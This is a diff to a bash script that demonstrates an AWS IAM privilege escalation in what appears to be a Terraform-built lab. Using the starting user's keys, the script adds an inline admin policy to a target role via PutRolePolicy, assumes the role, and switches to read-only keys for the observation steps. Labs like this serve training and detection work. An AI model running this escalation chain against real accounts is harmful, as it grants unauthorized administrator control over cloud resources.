@@ -66,6 +66,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -76,18 +85,29 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -102,15 +122,19 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -120,8 +144,10 @@ else
 fi
 echo ""
 
-# Step 5: Check target role's current inline policies
+# [OBSERVATION] Step 5: Check target role's current inline policies
 echo -e "${YELLOW}Step 5: Checking target role's current inline policies${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"
 echo "Target role: $TARGET_ROLE_ARN"
 echo ""
@@ -139,8 +165,10 @@ else
 fi
 echo -e "${GREEN}✓ Target role currently has no admin inline policies${NC}\n"
 
-# Step 6: Add inline admin policy to target role using PutRolePolicy
+# [EXPLOIT] Step 6: Add inline admin policy to target role using PutRolePolicy
 echo -e "${YELLOW}Step 6: Adding inline admin policy to target role${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "This is the privilege escalation action!"
 echo "Policy name: $INLINE_POLICY_NAME"
 echo ""
@@ -175,8 +203,10 @@ echo -e "${YELLOW}Waiting 15 seconds for policy to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
-# Step 7: Verify inline policy was added
+# [OBSERVATION] Step 7: Verify inline policy was added
 echo -e "${YELLOW}Step 7: Verifying inline policy addition${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "Updated inline policies on target role:"
 UPDATED_POLICIES=$(aws iam list-role-policies \
     --role-name $TARGET_ROLE \
@@ -191,8 +221,10 @@ else
     exit 1
 fi
 
-# Step 8: Assume the target role
+# [EXPLOIT] Step 8: Assume the target role
 echo -e "${YELLOW}Step 8: Assuming the target role with admin permissions${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Role ARN: $TARGET_ROLE_ARN"
 
 show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
@@ -214,12 +246,12 @@ ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed target role${NC}\n"
 
-# Step 9: Verify administrator access
+# [OBSERVATION] Step 9: Verify administrator access
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 echo ""
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
